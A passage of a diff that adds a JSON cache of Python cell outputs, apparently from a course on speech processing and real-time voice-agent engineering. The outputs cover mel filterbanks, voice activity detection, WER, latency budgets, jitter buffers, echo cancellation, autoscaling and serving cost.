+  "out": "samples 16000 bytes 32000 kbit/s 256.0\nframe 400 samples, hop 160 samples, frames 98\n9000 Hz sampled at 16 kHz appears at 7000 Hz"
+ },
+ "python:sp-c01-mel": {
+  "hash": "e654245e0c9f068b",
+  "out": "filterbank shape (40, 257)\nwidth of filter 0:     91.6 Hz\nwidth of filter 39:  1006.3 Hz\n  300 Hz tone: spectrogram (98, 40), loudest mel bin  5, centre   312.2 Hz\n 1000 Hz tone: spectrogram (98, 40), loudest mel bin 13, centre   955.0 Hz\n 3000 Hz tone: spectrogram (98, 40), loudest mel bin 26, centre  2979.7 Hz\n 6000 Hz tone: spectrogram (98, 40), loudest mel bin 36, centre  6103.7 Hz"
+ },
+ "python:sp-c01-phase": {
+  "hash": "5f213e5c86f0cc35",
+  "out": "largest magnitude difference 0.000 out of peak 800.0\nlargest sample difference    22.504\npeak of a 20.00, peak of b 10.78"
+ },
+ "python:sp-c01-vad": {
+  "hash": "34cf38bb46917e9f",
+  "out": "noise frames about -50.5 dBFS, speech frames about -23.0 dBFS\ntruth                      [(0.5, 1.2), (1.35, 2.0), (3.0, 3.6)]\nthreshold only             [(0.5, 0.66), (0.72, 0.9), (0.96, 1.16), (1.34, 1.5), (1.56, 1.76), (1.82, 2.0), (2.5, 2.52), (3.0, 3.16), (3.22, 3.4), (3.46, 3.6)]\n+ hangover 200 ms          [(0.5, 2.0), (2.5, 2.52), (3.0, 3.6)]\n+ min speech 60 ms         [(0.5, 2.0), (3.0, 3.6)]"
+ },
+ "python:sp-c01-vad-noise": {
+  "hash": "c75285fadb48d27a",
+  "out": "fixed -35 dBFS  speech caught 1.00  noise flagged before fan 0.00  after fan 1.00\nadaptive floor  speech caught 1.00  noise flagged before fan 0.00  after fan 0.36\nadaptive false alarms after the fan: 50 frames, last at 4.98 s"
+ },
+ "python:sp-c01-wer": {
+  "hash": "4f6cb5260b20c263",
+  "out": "S=0 D=1 I=1 WER=0.40  ref='turn the volume down please' hyp='turn volume down to please'\nS=0 D=0 I=0 WER=0.00  ref='book a table for two' hyp='book a table for two'\nS=1 D=1 I=0 WER=0.33  ref='call me at twenty five past' hyp='call me at 25 past'\nS=0 D=0 I=3 WER=3.00  ref='hi' hyp='oh hi there friend'\nS=0 D=3 I=0 WER=0.75  ref='oh hi there friend' hyp='hi'"
+ },
+ "python:sp-c02-budget": {
+  "hash": "22542914eeb025eb",
+  "out": "mic capture and encode       30 ms    30 ms    4%  device\nuplink network               40 ms    70 ms    5%  network\nserver jitter buffer         20 ms    90 ms    2%  buffer\nendpointing silence wait    250 ms   340 ms   31%  wait\nASR final result             40 ms   380 ms    5%  model\nLLM to first clause         220 ms   600 ms   28%  model\nTTS to first audio          100 ms   700 ms   12%  model\ndownlink network             40 ms   740 ms    5%  network\nclient jitter buffer         40 ms   780 ms    5%  buffer\ndecode and playout           20 ms   800 ms    2%  device\ntotal 800 ms\n{'buffer': 60, 'device': 50, 'model': 360, 'network': 80, 'wait': 250}"
+ },
+ "python:sp-c02-bw": {
+  "hash": "6de923f230fb2e6a",
+  "out": "packets per second 50, overhead per packet 50 bytes, 20 kbit/s\nopus  16 kbit/s:    40 byte payload,    36 kbit/s on the wire\nopus  24 kbit/s:    60 byte payload,    44 kbit/s on the wire\nopus  32 kbit/s:    80 byte payload,    52 kbit/s on the wire\nopus  64 kbit/s:   160 byte payload,    84 kbit/s on the wire\nraw 16 kHz PCM: 256 kbit/s before headers"
+ },
+ "python:sp-c02-c-jb": {
+  "hash": "08ba3ca45b788cb4",
+  "out": "20 ['play', 'play', 'late', 'lost', 'play', 'play', 'play']\n60 ['play', 'play', 'late', 'lost', 'play', 'play', 'play']\n100 ['play', 'play', 'play', 'lost', 'play', 'play', 'play']"
+ },
+ "python:sp-c02-c-rtp": {
+  "hash": "e68d4258e6d7fd11",
+  "out": "{'expected': 500, 'lost': 19, 'reordered': 28, 'jitter_ms': 9.6}"
+ },
+ "python:sp-c02-chunker": {
+  "hash": "e8334ad630b7b030",
+  "out": "naive split on '. ': ['Dr.', 'Rao can see you at 3.30 on Tuesday, and the visit takes about 20 minutes.']\nwait for the whole reply: first audio at 1030 ms\nsentences\n  ready at  600 ms, audio at  700 ms: Dr. Rao can see you at 3.30 on Tuesday, and the visit takes about 20 minutes.\n  ready at  750 ms, audio at  850 ms: Please bring your old reports.\n  ready at  930 ms, audio at 1030 ms: Would that time work for you?\nclauses\n  ready at  390 ms, audio at  490 ms: Dr. Rao can see you at 3.30 on Tuesday,\n  ready at  600 ms, audio at  700 ms: and the visit takes about 20 minutes.\n  ready at  750 ms, audio at  850 ms: Please bring your old reports.\n  ready at  930 ms, audio at 1030 ms: Would that time work for you?"
+ },
+ "python:sp-c02-d-budget": {
+  "hash": "1fbb6d930e23984c",
+  "out": "endpoint at 500: 1050\nadd 150 ms network each way: 1100\nall three: 1240"
+ },
+ "python:sp-c02-d-jitter": {
+  "hash": "6a6c244582aab863",
+  "out": "0 due 70 arrive 30 ok\n1 due 90 arrive 52 ok\n2 due 110 arrive 125 late\n3 due 130 arrive 91 ok\n4 due 150 arrive 112 ok\n5 due 170 arrive 130 ok"
+ },
+ "python:sp-c02-des": {
+  "hash": "3130e8d9c22ff265",
+  "out": "turns/s  stage p50 ms  p95 ms\n   5  asr    45    103  llm   177    403  tts    72    167  total   313    558\n  12  asr    47    110  llm   199    462  tts    80    188  total   346    630\n  18  asr    51    126  llm   379   1172  tts    95    235  total   556   1359"
+ },
+ "python:sp-c02-drift": {
+  "hash": "681a2127a816aa5a",
+  "out": " 20 ppm: 0.96 samples/s, 12 ms after 10 minutes\n100 ppm: 4.80 samples/s, 60 ms after 10 minutes\nplays for 2.00 s, pitch x 1.50\nthe reverse: plays for 4.50 s, pitch x 0.67"
+ },
+ "python:sp-c02-echo": {
+  "hash": "3c4ea6216ace49d4",
+  "out": "estimated echo delay 120.0 ms\nlast 1 s: mic  -27.3 dB, after canceller  -52.7 dB\nlargest learned tap at 120.0 ms\nreference arrives after the echo: last 1 s  -26.1 dB"
+ },
+ "python:sp-c02-hol": {
+  "hash": "c066fd486e8cf170",
+  "out": "lost in network: 61 of 3000\nUDP delivered 2939, late 0, concealed 61 (2.0%)\nTCP delivered 3000, p50 40 ms, p95 200 ms, max 240 ms\nTCP packets past a 100 ms deadline: 418 (13.9%)"
+ },
+ "python:sp-c02-jitter": {
+  "hash": "01cfb7e3dd112a46",
+  "out": "network delay: min 30 ms, median 36 ms, max 150 ms\ndepth   late packets   mouth-to-ear delay\n   0 ms      75.6%           32 ms\n  10 ms      22.7%           42 ms\n  20 ms       5.8%           52 ms\n  40 ms       1.5%           72 ms\n  60 ms       0.7%           92 ms\n  80 ms       0.4%          112 ms\n 120 ms       0.0%          152 ms\nRFC 3550 jitter estimate at the end: 5.5 ms"
+ },
+ "python:sp-c02-levels": {
+  "hash": "079ec4608fdce683",
+  "out": "normal       rms  -13.2 dBFS  peak   -7.5 dBFS  samples at full scale   0.0%\ngain x 2     rms   -7.2 dBFS  peak   -1.5 dBFS  samples at full scale   0.0%\ngain x 6     rms   -1.6 dBFS  peak    0.0 dBFS  samples at full scale  27.8%\ntoo quiet    rms  -53.2 dBFS  peak  -47.4 dBFS  samples at full scale   0.0%"
+ },
+ "python:sp-c02-partials": {
+  "hash": "391da4591e82dadd",
+  "out": " 1 partial: i                                committed:\n 2 partial: i want                           committed: i\n 3 partial: i want to                        committed: i want\n 4 partial: i want to book                   committed: i want to\n 5 partial: i want two book a                committed: i want to\n 6 partial: i want to book a table           committed: i want to\n 7 partial: i want to book a table for       committed: i want to book a table\n 8 partial: i want to book a table for two   committed: i want to book a table for\n 9 partial: i want to book a table for two   committed: i want to book a table for two\nwords revised between partials: 2"
+ },
+ "python:sp-c02-pct": {
+  "hash": "9060f289819dfb79",
+  "out": "stage     p50     p95     p99    mean\nasr        60      99     122      63\nllm       249     575     795     283\ntts       100     193     256     108\ntotal     423     756     974     455\nsum of stage p95s 866, p95 of the total 756\nmean of pod p95s 212, true p95 398\n   20 samples: p95 estimate ranges 379 to 705\n  100 samples: p95 estimate ranges 473 to 660\n 1000 samples: p95 estimate ranges 545 to 603"
+ },
+ "python:sp-c03-autoscale": {
+  "hash": "d72c63762ca7ca11",
+  "out": "target  startup  rejected session-min  pod-min  peak pods\n 0.90    245 s                546       810      23\n 0.60    245 s                310      1186      34\n 0.90     35 s                 24       810      23\n 0.75     35 s                  1       952      27\n 0.60     35 s                  0      1186      34"
+ },
+ "python:sp-c03-c-batch": {
+  "hash": "ccf1daa09d879b68",
+  "out": "20 requests/s\n  max wait  0 ms: mean batch  1.1, p50  24.0 ms, p95   47.6 ms\n  max wait  5 ms: mean batch  1.2, p50  29.0 ms, p95   47.6 ms\n  max wait 20 ms: mean batch  1.4, p50  44.0 ms, p95   52.0 ms\n  max wait 50 ms: mean batch  2.0, p50  74.0 ms, p95   83.9 ms\n80 requests/s\n  max wait  0 ms: mean batch  2.5, p50  47.8 ms, p95   71.5 ms\n  max wait  5 ms: mean batch  2.6, p50  47.9 ms, p95   71.7 ms\n  max wait 20 ms: mean batch  3.0, p50  51.0 ms, p95   72.8 ms\n  max wait 50 ms: mean batch  4.9, p50  73.2 ms, p95   94.8 ms"
+ },
+ "python:sp-c03-c-hash": {
+  "hash": "8e6ca04c1ccb3f0a",
+  "out": "load: [531, 491, 467, 511]\nadd one pod: 19.0% of sessions move, ideal is 20.0%\nsimple modulo: 80.8% move"
+ },
+ "python:sp-c03-canary": {
+  "hash": "50a2cef3dbb3dcbd",
+  "out": "control vs canary, failed calls\n  5.0% of 10000 vs 7.0% of 100: z = 0.91\n  5.0% of 10000 vs 7.0% of 1000: z = 2.72\n  5.0% of 100000 vs 7.0% of 10000: z = 8.60\nto detect 5.0% -> 7.0%: about 2207 calls per arm\nto detect 5.0% -> 6.0%: about 8146 calls per arm\nto detect 5.0% -> 5.5%: about 31195 calls per arm"
+ },
+ "python:sp-c03-coldstart": {
+  "hash": "8eca9fcd728a5b54",
+  "out": "nothing cached:              245 s\nimage on node:               95 s\nimage and weights on node:   35 s\nstart 245 s: sessions that arrive before a new pod is ready: 49\nstart  95 s: sessions that arrive before a new pod is ready: 19\nstart  35 s: sessions that arrive before a new pod is ready: 7"
+ },
+ "python:sp-c03-cost": {
+  "hash": "97b26d2dfb320177",
+  "out": "utilisation 50%: asr 0.167c, tts 0.178c, llm 0.216c, turn relay 0.001c, total 0.561c per minute\nutilisation 25%: asr 0.333c, tts 0.356c, llm 0.216c, turn relay 0.001c, total 0.906c per minute\nutilisation 80%: asr 0.104c, tts 0.111c, llm 0.216c, turn relay 0.001c, total 0.432c per minute"
+ },
+ "python:sp-c03-d-cost": {
+  "hash": "b6dc96a230739e7b",
+  "out": "0.33 cents per stream-minute\n0.20 cents at full utilisation"
+ },
+ "python:sp-c03-d-gpu": {
+  "hash": "468c9dfe9b52aac5",
+  "out": "30.0 GPUs at 100% utilisation\n42.86 GPUs at the 70% target\n43 whole GPUs"
+ },
+ "python:sp-c03-d-hpa": {
+  "hash": "e1c838383e055c13",
+  "out": "8\n4\n3"
+ },
+ "python:sp-c03-d-psi": {
+  "hash": "43e1292ef267218d",
+  "out": "0.879"
+ },
+ "python:sp-c03-hist": {
+  "hash": "de464f55af99fd93",
+  "out": "true p50 301, true p95 578\ncoarse  p50 322, p95 757\nfine    p50 301, p95 586\ntop bucket 400 ms: p95 reports 400, whatever the truth"
+ },
+ "python:sp-c03-hpa": {
+  "hash": "2e91e60b318ef58c",
+  "out": "pods  metric target desired\n   4      80     50       7\n   4      54     50       4\n  10      20     50       4\n   3      12      8       5\n   6     8.5      8       6"
+ },
+ "python:sp-c03-layers": {
+  "hash": "7172a49c6ff80774",
+  "out": "COPY all first: code change rebuilds ['COPY . /app', 'pip install -r requirements.txt'], 2502 MB of new layers\nrequirements first: code change rebuilds ['COPY . /app'], 2 MB of new layers"
+ },
+ "python:sp-c03-lb": {
+  "hash": "23eeab41d975cad0",
+  "out": "round robin        peak on one pod  17  mean busiest-minus-idlest  4.1  5 min after scale-out [12, 5, 7, 5]\nleast connections  peak on one pod  15  mean busiest-minus-idlest  1.0  5 min after scale-out [7, 8, 7, 7]"
+ },
+ "python:sp-c03-psi": {
+  "hash": "6797b5e6ff9d1537",
+  "out": "same distribution  mean SNR  25.0 dB  PSI 0.002\nmild shift         mean SNR  23.0 dB  PSI 0.148\nlarge shift        mean SNR  17.5 dB  PSI 3.410"
+ },
+ "python:sp-c03-trace": {
+  "hash": "61164d638fb1860b",
+  "out": "turn                     812 ms |##################################################\nvad.endpoint             262 ms |################\nasr.final                 42 ms |                ##\nllm.first_token          165 ms |                    ##########\nllm.first_clause          53 ms |                              ###\ntts.first_audio          123 ms |                                 #######\nnetwork.downlink          41 ms |                                         ##\nclient.buffer_and_play   100 ms |                                           ######\nuntraced gaps: [('asr.final', 'llm.first_token', 26)]\nslowest stage: vad.endpoint"
+ },
+ "python:sp-home-hero": {
+  "hash": "4b434396aad0c111",
+  "out": "one frame: 320 samples, 640 bytes\none second: 32000 bytes\nframes in an 800 ms budget: 40"
  }
 }
